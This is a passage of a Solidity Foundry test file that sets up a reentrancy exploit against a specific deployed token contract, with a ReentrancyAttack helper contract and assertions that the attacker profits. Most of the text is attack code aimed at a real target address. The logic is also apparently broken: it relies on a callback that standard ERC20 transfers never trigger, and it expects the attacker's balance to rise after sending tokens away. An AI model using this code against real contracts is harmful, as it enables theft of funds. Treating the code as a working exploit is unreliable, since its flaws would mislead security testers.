    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ILiquidityGeneratorToken {
    function numTokensSellToAddToLiquidity() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);
    ReentrancyAttack public attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create malicious contract for reentrancy attack
        attackContract = new ReentrancyAttack(TARGET);

        // Get some tokens to start with (attacker needs some tokens to initiate transfer)
        deal(TARGET, attacker, 1000 * 10**9); // 1000 tokens with 9 decimals

        // Ensure the contract has accumulated fees for swapAndLiquify
        // We need to make the contract's balance >= numTokensSellToAddToLiquidity
        // First, get the threshold value
        uint256 threshold = ILiquidityGeneratorToken(TARGET).numTokensSellToAddToLiquidity();

        // Transfer tokens to the contract to accumulate fees
        // We'll transfer enough to trigger swapAndLiquify
        vm.prank(attacker);
        IERC20(TARGET).transfer(address(attackContract), 500 * 10**9);

        // Now make the contract have enough tokens by transferring from another account
        address feeAccumulator = address(0x123);
        deal(TARGET, feeAccumulator, threshold * 2);
        vm.prank(feeAccumulator);
        IERC20(TARGET).transfer(TARGET, threshold);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceAttacker = IERC20(TARGET).balanceOf(attacker);

        // Start the attack
        attackContract.startAttack();

        // Make the initial transfer that will trigger reentrancy
        // The amount should be less than the threshold to avoid triggering swapAndLiquify initially
        uint256 attackAmount = 100 * 10**9; // 100 tokens

        vm.prank(attacker);
        IERC20(TARGET).transfer(address(attackContract), attackAmount);

        // The malicious contract's fallback will now reenter multiple times
        // Let it complete the attack
        attackContract.completeAttack();

        // Check final balance
        uint256 finalBalanceAttacker = IERC20(TARGET).balanceOf(attacker);

        // Verify the attack was successful (attacker's balance should have increased)
        assertGt(finalBalanceAttacker, initialBalanceAttacker, "Attacker balance should have increased due to reentrancy");

        uint256 finalBalanceThis = IERC20(0xE2C9C976337357369845c761DD851E2B6942D69f).balanceOf(address(this));
        uint256 initialBalanceThis = initialBalanceAttacker; // Same as attacker's initial balance
        assertGt(finalBalanceThis, initialBalanceThis, "Economic Exploit Failed: No ERC20 profit");
    }

    // Helper to interact with the token contract
    function getTokenBalance(address account) public view returns (uint256) {
        return IERC20(TARGET).balanceOf(account);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract ReentrancyAttack {
    IERC20 public token;
    bool public isAttacking;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 3; // Limit to avoid out of gas

    constructor(address _token) {
        token = IERC20(_token);
    }

    function startAttack() external {
        isAttacking = true;
        reentrancyCount = 0;
    }

    function completeAttack() external {
        isAttacking = false;
    }

    // This function will be called by the token contract's transfer
    function onTokenTransfer(address from, uint256 amount) external {
        if (isAttacking && reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // Reenter by transferring tokens again
            token.transfer(address(this), 1 * 10**9); // Transfer 1 token
        }
    }

    // Function to withdraw tokens
    function withdrawTokens(address to, uint256 amount) external {
        token.transfer(to, amount);
    }

    // Receive function for ERC20 transfers (not actually called by ERC20 transfers)
    receive() external payable {}
}

